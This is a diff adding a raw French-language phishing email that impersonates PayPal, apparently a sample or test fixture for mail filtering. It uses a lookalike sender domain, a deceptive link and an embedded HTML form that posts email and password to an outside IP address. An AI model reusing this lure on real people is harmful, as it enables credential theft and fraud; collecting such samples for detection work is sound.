@@ -1,0 +1,31 @@
+From: "PayPal Support" <service@paypa1-secure.xyz>
+Reply-To: billing@mailbox-recover.top
+Return-Path: <bounce@paypa1-secure.xyz>
+To: victim@example.com
+Subject: Votre compte sera suspendu - action requise immediatement
+Date: Mon, 13 Oct 2026 09:14:00 +0200
+Message-ID: <a9f3c21@mailbox-recover.top>
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=paypa1-secure.xyz;
+ dkim=none; dmarc=fail header.from=paypa1-secure.xyz
+Received: from unknown (HELO mailbox-recover.top) (185.220.101.47)
+ by mx.example.com with SMTP; Mon, 13 Oct 2026 09:14:00 +0200
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+
+<html>
+<body>
+<p>Cher client,</p>
+<p>Nous avons detecte une activite inhabituelle. Votre compte sera suspendu
+dans les 24 heures si vous ne verifiez pas vos informations
+<b>immediatement</b>.</p>
+<p>Veuillez confirmer votre identite ici :
+<a href="http://paypa1-secure.xyz/login/verify-account">https://www.paypal.com/account</a>
+</p>
+<form action="http://185.220.101.47/webscr/submit">
+  <input type="text" name="user" placeholder="Email">
+  <input type="password" name="pass" placeholder="Mot de passe">
+  <button>Confirmer</button>
+</form>
+<p>Cordialement,<br>Le service PayPal</p>
+</body>
+</html>
